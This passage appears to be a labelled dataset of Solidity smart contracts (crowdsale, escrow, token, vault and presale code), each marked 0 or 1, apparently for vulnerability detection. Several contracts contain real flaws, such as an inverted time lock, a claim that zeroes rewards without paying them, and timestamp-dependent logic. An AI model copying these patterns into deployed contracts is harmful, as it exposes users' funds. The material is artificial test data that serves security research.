1<CODESPLIT>contract CrowdSale is SellableToken {    uint256 public constant PRE_ICO_TIER_FIRST = 0;    uint256 public constant PRE_ICO_TIER_LAST = 4;    uint256 public constant ICO_TIER_FIRST = 5;    uint256 public constant ICO_TIER_LAST = 8;    SellableToken public privateSale;    uint256 public price;    Stats public preICOStats;    mapping(address => uint256) public icoBalances;    struct Stats {        uint256 soldTokens;        uint256 maxTokenSupply;        uint256 collectedUSD;        uint256 collectedEthers;        bool burned;    }    function CrowdSale(        address _token,        address _etherHolder,        uint256 _maxPreICOTokenSupply,             uint256 _maxICOTokenSupply,          uint256 _price,        uint256[2] _preIcoDuration,          uint256[2] _icoDuration,          uint256 _etherPriceInUSD    ) public    SellableToken(        _token,        _etherHolder,            _preIcoDuration[0],            _icoDuration[1],        _maxPreICOTokenSupply.add(_maxICOTokenSupply),        _etherPriceInUSD    ) {        softCap = 250000000000;        hardCap = 3578912800000;        price = _price;        preICOStats.maxTokenSupply = _maxPreICOTokenSupply;                          tiers.push(            Tier(                uint256(65),                _preIcoDuration[0],                _preIcoDuration[0].add(1 hours)            )        );        tiers.push(            Tier(                uint256(60),                _preIcoDuration[0].add(1 hours),                _preIcoDuration[0].add(1 days)            )        );        tiers.push(            Tier(                uint256(57),                _preIcoDuration[0].add(1 days),                _preIcoDuration[0].add(2 days)            )        );        tiers.push(            Tier(                uint256(55),                _preIcoDuration[0].add(2 days),                _preIcoDuration[0].add(3 days)            )        );        tiers.push(            Tier(                uint256(50),                _preIcoDuration[0].add(3 days),                _preIcoDuration[1]            )        );                 tiers.push(            Tier(                uint256(25),                _icoDuration[0],                _icoDuration[0].add(1 weeks)            )        );        tiers.push(            Tier(                uint256(15),                _icoDuration[0].add(1 weeks),                _icoDuration[0].add(2 weeks)            )        );        tiers.push(            Tier(                uint256(10),                _icoDuration[0].add(2 weeks),                _icoDuration[0].add(3 weeks)            )        );        tiers.push(            Tier(                uint256(5),                _icoDuration[0].add(3 weeks),                _icoDuration[1]            )        );    }    function changeICODates(uint256 _tierId, uint256 _start, uint256 _end) public onlyOwner {        require(_start != 0 && _start < _end && _tierId < tiers.length);        Tier storage icoTier = tiers[_tierId];        icoTier.startTime = _start;        icoTier.endTime = _end;        if (_tierId == PRE_ICO_TIER_FIRST) {            startTime = _start;        } else if (_tierId == ICO_TIER_LAST) {            endTime = _end;        }    }    function isActive() public view returns (bool) {        if (hardCap == collectedUSD.add(preICOStats.collectedUSD)) {            return false;        }        if (soldTokens == maxTokenSupply) {            return false;        }        return withinPeriod();    }    function withinPeriod() public view returns (bool) {        return getActiveTier() != tiers.length;    }    function setPrivateSale(address _privateSale) public onlyOwner {        if (_privateSale != address(0)) {            privateSale = SellableToken(_privateSale);        }    }    function getActiveTier() public view returns (uint256) {        for (uint256 i = 0; i < tiers.length; i++) {            if (block.timestamp >= tiers[i].startTime && block.timestamp <= tiers[i].endTime) {                return i;            }        }        return uint256(tiers.length);    }    function calculateTokensAmount(uint256 _value) public view returns (uint256 tokenAmount, uint256 usdAmount) {        if (_value == 0) {            return (0, 0);        }        uint256 activeTier = getActiveTier();        if (activeTier == tiers.length) {            if (endTime < block.timestamp) {                return (0, 0);            }            if (startTime > block.timestamp) {                activeTier = PRE_ICO_TIER_FIRST;            }        }        usdAmount = _value.mul(etherPriceInUSD);        tokenAmount = usdAmount.div(price * (100 - tiers[activeTier].discount) / 100);        usdAmount = usdAmount.div(uint256(10) ** 18);        if (usdAmount < minPurchase) {            return (0, 0);        }    }    function calculateEthersAmount(uint256 _tokens) public view returns (uint256 ethers, uint256 usdAmount) {        if (_tokens == 0) {            return (0, 0);        }        uint256 activeTier = getActiveTier();        if (activeTier == tiers.length) {            if (endTime < block.timestamp) {                return (0, 0);            }            if (startTime > block.timestamp) {                activeTier = PRE_ICO_TIER_FIRST;            }        }        usdAmount = _tokens.mul((price * (100 - tiers[activeTier].discount) / 100));        ethers = usdAmount.div(etherPriceInUSD);        if (ethers < getMinEthersInvestment()) {            return (0, 0);        }        usdAmount = usdAmount.div(uint256(10) ** 18);    }    function getStats(uint256 _ethPerBtc) public view returns (        uint256 sold,        uint256 maxSupply,        uint256 min,        uint256 soft,        uint256 hard,        uint256 tokenPrice,        uint256 tokensPerEth,        uint256 tokensPerBtc,        uint256[24] tiersData    ) {        sold = soldTokens;        maxSupply = maxTokenSupply.sub(preICOStats.maxTokenSupply);        min = minPurchase;        soft = softCap;        hard = hardCap;        tokenPrice = price;        uint256 usd;        (tokensPerEth, usd) = calculateTokensAmount(1 ether);        (tokensPerBtc, usd) = calculateTokensAmount(_ethPerBtc);        uint256 j = 0;        for (uint256 i = 0; i < tiers.length; i++) {            tiersData[j++] = uint256(tiers[i].discount);            tiersData[j++] = uint256(tiers[i].startTime);            tiersData[j++] = uint256(tiers[i].endTime);        }    }    function burnUnsoldTokens() public onlyOwner {        if (block.timestamp >= endTime && maxTokenSupply > soldTokens) {            token.burnUnsoldTokens(maxTokenSupply.sub(soldTokens));            maxTokenSupply = soldTokens;        }    }    function isTransferAllowed(address _from, uint256 _value) public view returns (bool status){        if (collectedUSD.add(preICOStats.collectedUSD) < softCap) {            if (token.balanceOf(_from) >= icoBalances[_from] && token.balanceOf(_from).sub(icoBalances[_from])> _value) {                return true;            }            return false;        }        return true;    }    function isRefundPossible() public view returns (bool) {        if (isActive() || block.timestamp < startTime || collectedUSD.add(preICOStats.collectedUSD) >= softCap) {            return false;        }        return true;    }    function refund() public returns (bool) {        if (!isRefundPossible() || etherBalances[msg.sender] == 0) {            return false;        }        uint256 burnedAmount = token.burnInvestorTokens(msg.sender, icoBalances[msg.sender]);        if (burnedAmount == 0) {            return false;        }        uint256 etherBalance = etherBalances[msg.sender];        etherBalances[msg.sender] = 0;        msg.sender.transfer(etherBalance);        Refund(msg.sender, etherBalance, burnedAmount);        return true;    }    function updatePreICOMaxTokenSupply(uint256 _amount) public {        if (msg.sender == address(privateSale)) {            maxTokenSupply = maxTokenSupply.add(_amount);            preICOStats.maxTokenSupply = preICOStats.maxTokenSupply.add(_amount);        }    }    function moveUnsoldTokensToICO() public onlyOwner {        uint256 unsoldTokens = preICOStats.maxTokenSupply - preICOStats.soldTokens;        if (unsoldTokens > 0) {            preICOStats.maxTokenSupply = preICOStats.soldTokens;        }    }    function transferEthers() internal {        if (collectedUSD.add(preICOStats.collectedUSD) >= softCap) {            etherHolder.transfer(this.balance);        }    }    function mintPreICO(        address _address,        uint256 _tokenAmount,        uint256 _ethAmount,        uint256 _usdAmount    ) internal returns (uint256) {        uint256 mintedAmount = token.mint(_address, _tokenAmount);        require(mintedAmount == _tokenAmount);        preICOStats.soldTokens = preICOStats.soldTokens.add(_tokenAmount);        preICOStats.collectedEthers = preICOStats.collectedEthers.add(_ethAmount);        preICOStats.collectedUSD = preICOStats.collectedUSD.add(_usdAmount);        require(preICOStats.maxTokenSupply >= preICOStats.soldTokens);        require(maxTokenSupply >= preICOStats.soldTokens);        return _tokenAmount;    }    function buy(address _address, uint256 _value) internal returns (bool) {        if (_value == 0 || _address == address(0)) {            return false;        }        uint256 activeTier = getActiveTier();        if (activeTier == tiers.length) {            return false;        }        uint256 tokenAmount;        uint256 usdAmount;        uint256 mintedAmount;        (tokenAmount, usdAmount) = calculateTokensAmount(_value);        require(usdAmount > 0 && tokenAmount > 0);        if (activeTier >= PRE_ICO_TIER_FIRST && activeTier <= PRE_ICO_TIER_LAST) {            mintedAmount = mintPreICO(_address, tokenAmount, _value, usdAmount);            etherHolder.transfer(this.balance);        } else {            mintedAmount = mintInternal(_address, tokenAmount);            require(soldTokens <= maxTokenSupply.sub(preICOStats.maxTokenSupply));            collectedUSD = collectedUSD.add(usdAmount);            require(hardCap >= collectedUSD.add(preICOStats.collectedUSD) && usdAmount > 0 && mintedAmount > 0);            collectedEthers = collectedEthers.add(_value);            etherBalances[_address] = etherBalances[_address].add(_value);            icoBalances[_address] = icoBalances[_address].add(tokenAmount);            transferEthers();        }        Contribution(_address, _value, tokenAmount);        return true;    }}
0<CODESPLIT>contract Escrow {    using SafeMath for uint256;    using ContentUtils for ContentUtils.ContentMapping;    ContentUtils.ContentMapping public content;    address escrowAddr = address(this);    uint256 public claimable = 0;     uint256 public currentBalance = 0;     mapping(bytes32 => uint256) public claimableRewards;         modifier validReward(uint256 _reward) {        require(_reward > 0 && _depositEscrow(_reward));        _;    }         function completeDeliverable(bytes32 _id, address _creator, address _brand) internal returns(bool) {        require(content.isFulfilled(_id, _creator, _brand));        content.completeDeliverable(_id);        return _approveEscrow(_id, content.rewardOf(_id));           }         function _depositEscrow(uint256 _amount) internal returns(bool) {        currentBalance = currentBalance.add(_amount);        return true;    }         function _approveEscrow(bytes32 _id, uint256 _amount) internal returns(bool) {        claimable = claimable.add(_amount);        claimableRewards[_id] = _amount;        return true;    }    function getClaimableRewards(bytes32 _id) public returns(uint256) {        return claimableRewards[_id];    }    function getContentByName(string _name) public view returns(        string name,        string description,        uint reward,        uint addedOn)     {        var (_content, exist) = content.getContentByName(_name);        if (exist) {            return (_content.name, _content.description, _content.deliverable.reward, _content.addedOn);        } else {            return ("", "", 0, 0);        }    }    function currentFulfillment(string _name) public view returns(bool fulfillment) {        var (_content, exist) = content.getContentByName(_name);        if (exist) {            return _content.deliverable.fulfillment[msg.sender];        } else {            false;        }    }} library SafeMath {     function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {                   if (a == 0) {      return 0;    }    c = a * b;    assert(c / a == b);    return c;  }     function div(uint256 a, uint256 b) internal pure returns (uint256) {                   return a / b;  }     function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b <= a);    return a - b;  }     function add(uint256 a, uint256 b) internal pure returns (uint256 c) {    c = a + b;    assert(c >= a);    return c;  }}library DeliverableUtils {    struct Deliverable {        uint256 reward;        mapping(address=>bool) fulfillment;        bool fulfilled;    }         function fulfill(Deliverable storage self, address _creator, address _brand) internal returns(bool) {        require(msg.sender == _creator || msg.sender == _brand);        self.fulfillment[msg.sender] = true;        return self.fulfillment[_creator] && self.fulfillment[_brand];    }         function isFulfilled(Deliverable storage self, address _creator, address _brand) internal view returns(bool) {        return self.fulfillment[_creator] && self.fulfillment[_brand];    }         function newDeliverable(uint256 _reward) internal pure returns(Deliverable _deliverable) {        require(_reward > 0);        return Deliverable(_reward, false);    }}library ContentUtils {    using SafeMath for uint256;    using DeliverableUtils for DeliverableUtils.Deliverable;    struct Content {        bytes32 id;        string name;        string description;        uint addedOn;        DeliverableUtils.Deliverable deliverable;    }         struct ContentMapping {        mapping(bytes32=>Content) data;        bytes32[] keys;        bool locked;    }    string constant UNIQUE_KEY_ERR = "Content with ID already exists ";    string constant KEY_NOT_FOUND_ERR = "Key not found";         function put(ContentMapping storage self,         string _name,         string _description,         uint _reward) public returns (bool)     {            require(!self.locked);            bytes32 _id = generateContentID(_name);            require(self.data[_id].id == bytes32(0));            self.data[_id] = Content(_id, _name, _description, block.timestamp, DeliverableUtils.newDeliverable(_reward));            self.keys.push(_id);            return true;    }             function size(ContentMapping storage self) public view returns (uint) {        return self.keys.length;    }         function rewardOf(ContentMapping storage self, bytes32 _id) public view returns (uint256) {        return self.data[_id].deliverable.reward;    }    function getKey(ContentMapping storage self, uint _index) public view returns (bytes32) {        isValidIndex(_index, self.keys.length);        return self.keys[_index];    }         function getContentByName(ContentMapping storage self, string _name) public view returns (Content storage _content, bool exists) {        bytes32 _hash = generateContentID(_name);        return (self.data[_hash], self.data[_hash].addedOn != 0);    }         function getContentByID(ContentMapping storage self, bytes32 _id) public view returns (Content storage _content, bool exists) {        return (self.data[_id], self.data[_id].id == bytes32(0));    }         function getContentByKeyIndex(ContentMapping storage self, uint _index) public view returns (Content storage _content) {        isValidIndex(_index, self.keys.length);        return (self.data[self.keys[_index]]);    }         function fulfill(ContentMapping storage self, bytes32 _id, address _creator, address _brand) public returns(bool) {        return self.data[_id].deliverable.fulfill(_creator, _brand);    }         function isFulfilled(ContentMapping storage self, bytes32 _id, address _creator, address _brand) public view returns(bool) {        return self.data[_id].deliverable.isFulfilled(_creator, _brand);    }         function completeDeliverable(ContentMapping storage self, bytes32 _id) internal returns(bool) {        self.data[_id].deliverable.fulfilled = true;        return true;    }         function generateContentID(string _name) public pure returns (bytes32) {        return keccak256(_name);    }         function isValidIndex(uint _index, uint _size) public pure {        require(_index < _size, KEY_NOT_FOUND_ERR);    }}
0<CODESPLIT>contract Agreement is Escrow {        bool public locked;    uint  public createdOn;    uint public expiration;    uint public startTime;    address public brand;    address public creator;        constructor(address _creator, uint _expiration, address _token) public {        brand = msg.sender;        creator = _creator;        expiration = _expiration;    }         modifier onlyBrand() {        require(msg.sender == brand);        _;    }         modifier onlyCreator() {        require(msg.sender == creator);        _;    }         modifier fulfilled(bytes32 _id) {        require(content.isFulfilled(_id, creator, brand));        _;    }         modifier expired() {        require(block.timestamp > expiration);        _;    }         modifier notExpired() {        require(block.timestamp < expiration);        _;    }         modifier notLocked() {        require(!locked);        _;    }         function addContent(string _name,         string _description,         uint _reward) notLocked onlyBrand validReward(_reward)         public returns(bool _success) {            return content.put(_name, _description, _reward);    }    function _fulfill(bytes32 _id) private returns (bool) {        bool _fulfilled = content.fulfill(_id, creator, brand);        if(_fulfilled) {            return completeDeliverable(_id, creator, brand);        }        return false;    }    function fulfillDeliverable(bytes32 _id) notExpired onlyCreator public returns (bool) {        return _fulfill(_id);    }    function approveDeliverable(bytes32 _id) onlyBrand public returns (bool) {        return _fulfill(_id);    }        function claim(bytes32 _id) external onlyCreator {        claimableRewards[_id] = 0;    }    function lock() onlyBrand public {        content.locked == true;        locked = true;        startTime = block.timestamp;    }    function extendExpiration(uint _expiration) onlyBrand public returns (bool) {        require(_expiration > expiration && _expiration >= block.timestamp);        expiration = _expiration;        return true;    }    function destroy() onlyBrand expired public {        selfdestruct(msg.sender);    }    function deposit() payable {}} 
0<CODESPLIT>contract CCOIN is ERC20, Ownable {    struct Escrow {        address creator;        address brand;        address agreementContract;        uint256 reward;    }         string public constant name = "CCOIN";    string public constant symbol = "CCOIN";    uint public constant decimals = 18;    uint public totalSupply = 1000000000 * 10 ** 18;    bool public locked;    address public multisigETH;      address public crowdSaleaddress;      uint public ethReceived;      uint public totalTokensSent;      uint public startBlock;      uint public endBlock;      uint public maxCap;      uint public minCap;      uint public minContributionETH;      uint public tokenPriceWei;    uint firstPeriod;    uint secondPeriod;    uint thirdPeriod;    uint fourthPeriod;    uint fifthPeriod;    uint firstBonus;    uint secondBonus;    uint thirdBonus;    uint fourthBonus;    uint fifthBonus;    uint public multiplier;    bool public stopInEmergency = false;    mapping(address => uint) balances;    mapping(address => mapping(address => uint)) allowed;    mapping(address => Escrow) escrowAgreements;         mapping(address => bool) public whitelisted;    event Whitelist(address indexed participant);    event Locked();    event Unlocked();    event StoppedCrowdsale();    event RestartedCrowdsale();    event Burned(uint256 value);         modifier onlyUnlocked() {        if (msg.sender != crowdSaleaddress && locked && msg.sender != owner)            revert();        _;    }         modifier onlyPayloadSize(uint numWords){        assert(msg.data.length >= numWords * 32 + 4);        _;    }    modifier onlyAuthorized() {        if (msg.sender != crowdSaleaddress && msg.sender != owner)            revert();        _;    }         constructor() public {        locked = true;        multiplier = 10 ** 18;        multisigETH = msg.sender;        minContributionETH = 1;        startBlock = 0;        endBlock = 0;        maxCap = 1000 * multiplier;        tokenPriceWei = SafeMath.div(1, 1400);        minCap = 100 * multiplier;        totalTokensSent = 0;        firstPeriod = 100;        secondPeriod = 200;        thirdPeriod = 300;        fourthPeriod = 400;        fifthPeriod = 500;        firstBonus = 120;        secondBonus = 115;        thirdBonus = 110;        fourthBonus = SafeMath.div(1075, 10);        fifthBonus = 105;        balances[multisigETH] = totalSupply;    }    function resetCrowdSaleaddress(address _newCrowdSaleaddress) public onlyAuthorized() {        crowdSaleaddress = _newCrowdSaleaddress;    }    function unlock() public onlyAuthorized {        locked = false;        emit Unlocked();    }    function lock() public onlyAuthorized {        locked = true;        emit Locked();    }    function burn(address _member, uint256 _value) public onlyAuthorized returns (bool) {        balances[_member] = SafeMath.sub(balances[_member], _value);        totalSupply = SafeMath.sub(totalSupply, _value);        emit Transfer(_member, 0x0, _value);        emit Burned(_value);        return true;    }    function Airdrop(address _to, uint256 _tokens) external onlyAuthorized returns(bool) {        require(transfer(_to, _tokens));    }     function transfer(address _to, uint _value) public onlyUnlocked returns (bool) {        balances[msg.sender] = SafeMath.sub(balances[msg.sender], _value);        balances[_to] = SafeMath.add(balances[_to], _value);        emit Transfer(msg.sender, _to, _value);        return true;    }         function transferFrom(address _from, address _to, uint256 _value) public onlyUnlocked returns (bool success) {        if (balances[_from] < _value)            revert();                 if (_value > allowed[_from][msg.sender])            revert();                 balances[_from] = SafeMath.sub(balances[_from], _value);                 balances[_to] = SafeMath.add(balances[_to], _value);                 allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender], _value);        emit Transfer(_from, _to, _value);        return true;    }    function balanceOf(address _owner) public constant returns (uint balance) {        return balances[_owner];    }    function approve(address _spender, uint _value) public returns (bool) {        allowed[msg.sender][_spender] = _value;        emit Approval(msg.sender, _spender, _value);        return true;    }    function allowance(address _owner, address _spender) public constant returns (uint remaining) {        return allowed[_owner][_spender];    }    function withdrawFromEscrow(address _agreementAddr, bytes32 _id) {        require(balances[_agreementAddr] > 0);        Agreement agreement = Agreement(_agreementAddr);        require(agreement.creator() == msg.sender);        uint256 reward = agreement.getClaimableRewards(_id);        require(reward > 0);        balances[_agreementAddr] = SafeMath.sub(balances[_agreementAddr], reward);        balances[msg.sender] = SafeMath.add(balances[msg.sender], reward);    }    function WhitelistParticipant(address participant) external onlyAuthorized {        whitelisted[participant] = true;        emit Whitelist(participant);    }    function BlacklistParticipant(address participant) external onlyAuthorized {        whitelisted[participant] = false;        emit Whitelist(participant);    }              function() public payable onlyPayloadSize(2) {        contribute(msg.sender);    }                   function contribute(address _backer) internal returns (bool res) {                 if (msg.value < minContributionETH)            revert();                 uint tokensToSend = calculateNoOfTokensToSend();                 if (SafeMath.add(totalTokensSent, tokensToSend) > maxCap)            revert();                 if (!transfer(_backer, tokensToSend))            revert();        ethReceived = SafeMath.add(ethReceived, msg.value);        totalTokensSent = SafeMath.add(totalTokensSent, tokensToSend);        return true;    }         function calculateNoOfTokensToSend() constant internal returns (uint) {        uint tokenAmount = SafeMath.div(SafeMath.mul(msg.value, multiplier), tokenPriceWei);        if (block.number <= startBlock + firstPeriod)            return tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, firstBonus), 100);        else if (block.number <= startBlock + secondPeriod)            return tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, secondBonus), 100);        else if (block.number <= startBlock + thirdPeriod)            return tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, thirdBonus), 100);        else if (block.number <= startBlock + fourthPeriod)            return tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, fourthBonus), 100);        else if (block.number <= startBlock + fifthPeriod)            return tokenAmount + SafeMath.div(SafeMath.mul(tokenAmount, fifthBonus), 100);        else            return tokenAmount;    }    function stopCrowdsale() external onlyOwner{        stopInEmergency = true;        emit StoppedCrowdsale();    }    function restartCrowdsale() external onlyOwner{        stopInEmergency = false;        emit RestartedCrowdsale();    }}
1<CODESPLIT>contract Vault is Ownable {  TokenContract public tkn;  uint256 public releaseDate;  struct Member {    address memberAddress;    uint256 tokens;  }  Member[] public team;     constructor() public {    releaseDate = 1561426200;    }     function releaseTokens() onlyOwner public {    require(releaseDate > block.timestamp);    uint256 amount;    for (uint256 i = 0; i < team.length; i++) {      require(tkn.transfer(team[i].memberAddress, team[i].tokens));    }    amount = tkn.balanceOf(address(this));    require(tkn.transfer(owner, amount));    selfdestruct(owner);  }     function addMembers(address[] _member, uint256[] _tokens) onlyOwner public {    require(_member.length > 0);    require(_member.length == _tokens.length);    Member memory member;    for (uint256 i = 0; i < _member.length; i++) {      member.memberAddress = _member[i];      member.tokens = _tokens[i];      team.push(member);    }  }}
0<CODESPLIT>contract AccessService is AccessAdmin {    address public addrService;    address public addrFinance;    modifier onlyService() {        require(msg.sender == addrService);        _;    }    modifier onlyFinance() {        require(msg.sender == addrFinance);        _;    }    function setService(address _newService) external {        require(msg.sender == addrService || msg.sender == addrAdmin);        require(_newService != address(0));        addrService = _newService;    }    function setFinance(address _newFinance) external {        require(msg.sender == addrFinance || msg.sender == addrAdmin);        require(_newFinance != address(0));        addrFinance = _newFinance;    }    function withdraw(address _target, uint256 _amount)         external     {        require(msg.sender == addrFinance || msg.sender == addrAdmin);        require(_amount > 0);        address receiver = _target == address(0) ? addrFinance : _target;        uint256 balance = address(this).balance;        if (_amount < balance) {            receiver.transfer(_amount);        } else {            receiver.transfer(address(this).balance);        }          }}interface WarTokenInterface {    function getFashion(uint256 _tokenId) external view returns(uint16[12]);    function ownerOf(uint256 _tokenId) external view returns (address);    function safeTransferByContract(uint256 _tokenId, address _to) external;} interface WonderTokenInterface {    function transferFrom(address _from, address _to, uint256 _tokenId) external;    function safeGiveByContract(uint256 _tokenId, address _to) external;    function getProtoIdByTokenId(uint256 _tokenId) external view returns(uint256); }interface ManagerTokenInterface {    function transferFrom(address _from, address _to, uint256 _tokenId) external;    function safeGiveByContract(uint256 _tokenId, address _to) external;    function getProtoIdByTokenId(uint256 _tokenId) external view returns(uint256);}interface TalentCardInterface {    function safeSendCard(uint256 _amount, address _to) external;}interface ERC20BaseInterface {    function balanceOf(address _from) external view returns(uint256);    function transfer(address _to, uint256 _value) external;    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);    function approve(address _spender, uint256 _value) external; }
0<CODESPLIT>contract TTCInterface is ERC20BaseInterface {    function approveAndCall(address _spender, uint256 _value, bytes _extraData) external returns (bool);}
1<CODESPLIT>contract TTPresale is AccessService {    TTCInterface ttcToken;    WarTokenInterface warToken;    ManagerTokenInterface ttmToken;    WonderTokenInterface ttwToken;    event ManagerSold(        address indexed buyer,        address indexed buyTo,        uint256 mgrId,        uint256 nextTokenId    );    event WonderSold(        address indexed buyer,        address indexed buyTo,        uint256 wonderId,        uint256 nextTokenId    );    constructor() public {        addrAdmin = msg.sender;        addrFinance = msg.sender;        addrService = msg.sender;        ttcToken = TTCInterface(0xfB673F08FC82807b4D0E139e794e3b328d63551f);        warToken = WarTokenInterface(0xDA9c03dFd4D137F926c3cF6953cb951832Eb08b2);    }    function() external payable {    }    uint64 public nextDiscountTTMTokenId1 = 1;           uint64 public nextDiscountTTMTokenId6 = 361;         uint64 public nextCommonTTMTokenId2 = 51;            uint64 public nextCommonTTMTokenId3 = 131;           uint64 public nextCommonTTMTokenId7 = 391;           uint64 public nextCommonTTMTokenId8 = 451;           uint64 public nextDiscountTTWTokenId1 = 1;           uint64 public nextCommonTTWTokenId2 = 31;            function setNextDiscountTTMTokenId1(uint64 _val) external onlyAdmin {        require(nextDiscountTTMTokenId1 >= 1 && nextDiscountTTMTokenId1 <= 51);        nextDiscountTTMTokenId1 = _val;    }    function setNextDiscountTTMTokenId6(uint64 _val) external onlyAdmin {        require(nextDiscountTTMTokenId6 >= 361 && nextDiscountTTMTokenId6 <= 391);        nextDiscountTTMTokenId6 = _val;    }    function setNextCommonTTMTokenId2(uint64 _val) external onlyAdmin {        require(nextCommonTTMTokenId2 >= 51 && nextCommonTTMTokenId2 <= 131);        nextCommonTTMTokenId2 = _val;    }    function setNextCommonTTMTokenId3(uint64 _val) external onlyAdmin {        require(nextCommonTTMTokenId3 >= 131 && nextCommonTTMTokenId3 <= 211);        nextCommonTTMTokenId3 = _val;    }    function setNextCommonTTMTokenId7(uint64 _val) external onlyAdmin {        require(nextCommonTTMTokenId7 >= 391 && nextCommonTTMTokenId7 <= 451);        nextCommonTTMTokenId7 = _val;    }    function setNextCommonTTMTokenId8(uint64 _val) external onlyAdmin {        require(nextCommonTTMTokenId8 >= 451 && nextCommonTTMTokenId8 <= 511);        nextCommonTTMTokenId8 = _val;    }    function setNextDiscountTTWTokenId1(uint64 _val) external onlyAdmin {        require(nextDiscountTTWTokenId1 >= 1 && nextDiscountTTWTokenId1 <= 31);        nextDiscountTTWTokenId1 = _val;    }    function setNextCommonTTWTokenId2(uint64 _val) external onlyAdmin {        require(nextCommonTTWTokenId2 >= 31 && nextCommonTTWTokenId2 <= 91);        nextCommonTTWTokenId2 = _val;    }    uint64 public endDiscountTime = 0;    function setDiscountTime(uint64 _endTime) external onlyAdmin {        require(_endTime > block.timestamp);        endDiscountTime = _endTime;    }    function setWARTokenAddress(address _addr) external onlyAdmin {        require(_addr != address(0));        warToken = WarTokenInterface(_addr);    }    function setTTMTokenAddress(address _addr) external onlyAdmin {        require(_addr != address(0));        ttmToken = ManagerTokenInterface(_addr);    }    function setTTWTokenAddress(address _addr) external onlyAdmin {        require(_addr != address(0));        ttwToken = WonderTokenInterface(_addr);    }    function setTTCTokenAddress(address _addr) external onlyAdmin {        require(_addr != address(0));        ttcToken = TTCInterface(_addr);    }    function _getExtraParam(bytes _extraData)         private         pure        returns(address addr, uint64 f, uint256 protoId)     {        assembly { addr := mload(add(_extraData, 20)) }         f = uint64(_extraData[20]);        protoId = uint256(_extraData[21]) * 256 + uint256(_extraData[22]);    }    function receiveApproval(address _sender, uint256 _value, address _token, bytes _extraData)         external        whenNotPaused     {        require(msg.sender == address(ttcToken));        require(_extraData.length == 23);        (address toAddr, uint64 f, uint256 protoId) = _getExtraParam(_extraData);        require(ttcToken.transferFrom(_sender, address(this), _value));        if (f == 0) {            _buyDiscountTTM(_value, protoId, toAddr, _sender);        } else if (f == 1) {            _buyDiscountTTW(_value, protoId, toAddr, _sender);        } else if (f == 2) {            _buyCommonTTM(_value, protoId, toAddr, _sender);        } else if (f == 3) {            _buyCommonTTW(_value, protoId, toAddr, _sender);        } else {            require(false, "Invalid func id");        }    }    function exchangeByPet(uint256 _warTokenId, uint256 _mgrId, address _gameWalletAddr)          external        whenNotPaused    {        require(warToken.ownerOf(_warTokenId) == msg.sender);        uint16[12] memory warData = warToken.getFashion(_warTokenId);        uint16 protoId = warData[0];        if (_mgrId == 2) {            require(protoId == 10001 || protoId == 10003);            require(nextCommonTTMTokenId2 <= 130);            warToken.safeTransferByContract(_warTokenId, address(this));            nextCommonTTMTokenId2 += 1;            ttmToken.safeGiveByContract(nextCommonTTMTokenId2 - 1, _gameWalletAddr);            emit ManagerSold(msg.sender, _gameWalletAddr, 2, nextCommonTTMTokenId2);        } else if (_mgrId == 3) {            require(protoId == 10001 || protoId == 10003);            require(nextCommonTTMTokenId3 <= 210);            warToken.safeTransferByContract(_warTokenId, address(this));            nextCommonTTMTokenId3 += 1;            ttmToken.safeGiveByContract(nextCommonTTMTokenId3 - 1, _gameWalletAddr);            emit ManagerSold(msg.sender, _gameWalletAddr, 3, nextCommonTTMTokenId3);        } else if (_mgrId == 7) {            require(protoId == 10002 || protoId == 10004 || protoId == 10005);            require(nextCommonTTMTokenId7 <= 450);            warToken.safeTransferByContract(_warTokenId, address(this));            nextCommonTTMTokenId7 += 1;            ttmToken.safeGiveByContract(nextCommonTTMTokenId7 - 1, _gameWalletAddr);            emit ManagerSold(msg.sender, _gameWalletAddr, 7, nextCommonTTMTokenId7);        } else if (_mgrId == 8) {            require(protoId == 10002 || protoId == 10004 || protoId == 10005);            require(nextCommonTTMTokenId8 <= 510);            warToken.safeTransferByContract(_warTokenId, address(this));            nextCommonTTMTokenId8 += 1;            ttmToken.safeGiveByContract(nextCommonTTMTokenId8 - 1, _gameWalletAddr);            emit ManagerSold(msg.sender, _gameWalletAddr, 8, nextCommonTTMTokenId8);        } else {            require(false);        }    }    function buyDiscountTTMByETH(uint256 _mgrId, address _gameWalletAddr)         external         payable        whenNotPaused     {        _buyDiscountTTM(msg.value, _mgrId, _gameWalletAddr, msg.sender);    }    function buyDiscountTTWByETH(uint256 _wonderId, address _gameWalletAddr)         external         payable        whenNotPaused     {        _buyDiscountTTW(msg.value, _wonderId, _gameWalletAddr, msg.sender);    }        function buyCommonTTMByETH(uint256 _mgrId, address _gameWalletAddr)         external        payable        whenNotPaused    {        _buyCommonTTM(msg.value, _mgrId, _gameWalletAddr, msg.sender);    }    function buyCommonTTWByETH(uint256 _wonderId, address _gameWalletAddr)         external        payable        whenNotPaused    {        _buyCommonTTW(msg.value, _wonderId, _gameWalletAddr, msg.sender);    }    function _buyDiscountTTM(uint256 _value, uint256 _mgrId, address _gameWalletAddr, address _buyer)         private      {        require(_gameWalletAddr != address(0));        if (_mgrId == 1) {            require(nextDiscountTTMTokenId1 <= 50, "This Manager is sold out");            if (block.timestamp <= endDiscountTime) {                require(_value == 0.64 ether);            } else {                require(_value == 0.99 ether);            }            nextDiscountTTMTokenId1 += 1;            ttmToken.safeGiveByContract(nextDiscountTTMTokenId1 - 1, _gameWalletAddr);            emit ManagerSold(_buyer, _gameWalletAddr, 1, nextDiscountTTMTokenId1);        } else if (_mgrId == 6) {            require(nextDiscountTTMTokenId6 <= 390, "This Manager is sold out");            if (block.timestamp <= endDiscountTime) {                require(_value == 0.97 ether);            } else {                require(_value == 1.49 ether);            }            nextDiscountTTMTokenId6 += 1;            ttmToken.safeGiveByContract(nextDiscountTTMTokenId6 - 1, _gameWalletAddr);            emit ManagerSold(_buyer, _gameWalletAddr, 6, nextDiscountTTMTokenId6);        } else {            require(false);        }    }    function _buyDiscountTTW(uint256 _value, uint256 _wonderId, address _gameWalletAddr, address _buyer)         private     {        require(_gameWalletAddr != address(0));        require(_wonderId == 1);         require(nextDiscountTTWTokenId1 <= 30, "This Manager is sold out");        if (block.timestamp <= endDiscountTime) {            require(_value == 0.585 ether);        } else {            require(_value == 0.90 ether);        }        nextDiscountTTWTokenId1 += 1;        ttwToken.safeGiveByContract(nextDiscountTTWTokenId1 - 1, 